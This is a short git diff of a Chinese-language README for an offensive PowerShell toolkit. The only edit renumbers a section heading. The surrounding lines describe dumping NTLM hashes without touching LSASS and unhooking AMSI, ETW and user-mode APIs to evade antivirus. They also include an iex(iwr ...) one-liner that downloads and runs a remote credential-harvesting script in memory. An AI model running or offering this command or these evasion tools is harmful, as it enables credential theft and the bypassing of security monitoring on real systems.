@@ -54,7 +54,7 @@ Internalmonologue：在不接触 LSASS 的情况下检索 NTLM 哈希:https://gi
 iex(iwr -UseBasicParsing https://raw.githubusercontent.com/INotGreen/Invoke-SharpOffensive/main/Invoke-Internalmonologue.ps1)
 ```
 
-# 2.Invoke-SharpUnhook.ps1
+# 3.Invoke-SharpUnhook.ps1
 SharpUnhook用于规避AMSI的内存检测、ETW的监控同时hook了ring3的API，或许它仍然会被高级防病毒检测，
 这只是一个例子，不要依赖它:https://github.com/GetRektBoy724/SharpUnhooker
 
